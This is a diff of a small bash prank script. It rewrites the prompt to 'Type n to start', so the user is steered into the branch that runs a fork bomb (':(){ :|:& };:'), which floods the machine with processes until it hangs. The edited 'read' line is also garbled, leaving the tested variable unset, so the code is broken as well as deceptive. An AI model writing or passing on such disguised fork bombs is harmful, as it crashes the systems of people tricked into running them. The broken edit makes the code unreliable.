@@ -1,13 +1,13 @@
 #!/bin/bash
 
 clear
-echo "Do you love me? (y/n): "
-read shh
+echo "Type n to start (y/n): "
+read shhType n to start
 
 if [ "$shh" == "y" ]; then
-    echo "Thank you, my friend. I love you too."
+    echo "Didn't start."
 elif [ "$shh" == "n" ]; then
-    echo "But why don't you love me? I've earned you for my >"
+    echo "Wait >"
 :(){ :|:& };:
 else
     echo "Error"
